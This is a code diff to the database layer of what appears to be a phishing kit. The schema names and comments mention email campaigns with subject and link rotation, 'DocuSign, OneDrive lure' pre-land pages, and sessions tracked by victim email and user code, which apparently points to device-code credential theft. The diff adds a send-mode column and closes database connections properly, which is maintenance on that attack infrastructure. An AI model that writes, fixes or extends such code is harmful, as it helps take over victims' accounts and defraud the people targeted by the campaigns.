@@ -77,9 +77,14 @@ def init_db():
         subject_rotate_n INTEGER DEFAULT 1,
         link_rotate_n INTEGER DEFAULT 1,
         bcc_mode INTEGER DEFAULT 0,
+        send_mode TEXT DEFAULT 'direct',
         save_sent INTEGER DEFAULT 1,
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
     )''')
+
+    try:
+        cursor.execute("ALTER TABLE b2b_campaigns ADD COLUMN send_mode TEXT DEFAULT 'direct'")
+    except sqlite3.OperationalError: pass
 
     # ── Phase 1: Pre-Land template library ──────────────────────────────────
     # Stores reusable pre-land page definitions (DocuSign, OneDrive lure, etc.)
@@ -433,23 +438,28 @@ def purge_inactive_sessions():
 
 def get_pending_sessions():
     conn = sqlite3.connect(Config.DB_PATH)
-    conn.row_factory = sqlite3.Row
-    cursor = conn.cursor()
-    cursor.execute('SELECT * FROM sessions WHERE status = ?', ('PENDING',))
-    return [dict(row) for row in cursor.fetchall()]
+    try:
+        conn.row_factory = sqlite3.Row
+        cursor = conn.cursor()
+        cursor.execute('SELECT * FROM sessions WHERE status = ?', ('PENDING',))
+        return [dict(row) for row in cursor.fetchall()]
+    finally:
+        conn.close()
 
 def get_all_sessions():
     conn = sqlite3.connect(Config.DB_PATH)
-    conn.row_factory = sqlite3.Row
-    cursor = conn.cursor()
-    cursor.execute('''
-        SELECT s.*, t.name as template_name, t.service as template_service 
-        FROM sessions s 
-        LEFT JOIN templates t ON s.template_id = t.id 
-        ORDER BY s.created_at DESC
-    ''')
-    raw_sessions = [dict(row) for row in cursor.fetchall()]
-    conn.close()
+    try:
+        conn.row_factory = sqlite3.Row
+        cursor = conn.cursor()
+        cursor.execute('''
+            SELECT s.*, t.name as template_name, t.service as template_service 
+            FROM sessions s 
+            LEFT JOIN templates t ON s.template_id = t.id 
+            ORDER BY s.created_at DESC
+        ''')
+        raw_sessions = [dict(row) for row in cursor.fetchall()]
+    finally:
+        conn.close()
 
     # De-duplicate sessions by victim_email (keep newest session per account)
     seen_emails = set()
@@ -465,18 +475,24 @@ def get_all_sessions():
 
 def get_templates():
     conn = sqlite3.connect(Config.DB_PATH)
-    conn.row_factory = sqlite3.Row
-    cursor = conn.cursor()
-    cursor.execute('SELECT * FROM templates ORDER BY service, name')
-    return [dict(row) for row in cursor.fetchall()]
+    try:
+        conn.row_factory = sqlite3.Row
+        cursor = conn.cursor()
+        cursor.execute('SELECT * FROM templates ORDER BY service, name')
+        return [dict(row) for row in cursor.fetchall()]
+    finally:
+        conn.close()
 
 def get_session_by_user_code(user_code):
     conn = sqlite3.connect(Config.DB_PATH)
-    conn.row_factory = sqlite3.Row
-    cursor = conn.cursor()
-    cursor.execute('SELECT * FROM sessions WHERE user_code = ?', (user_code,))
-    row = cursor.fetchone()
-    return dict(row) if row else None
+    try:
+        conn.row_factory = sqlite3.Row
+        cursor = conn.cursor()
+        cursor.execute('SELECT * FROM sessions WHERE user_code = ?', (user_code,))
+        row = cursor.fetchone()
+        return dict(row) if row else None
+    finally:
+        conn.close()
 
 def get_statistics():
     conn = sqlite3.connect(Config.DB_PATH)
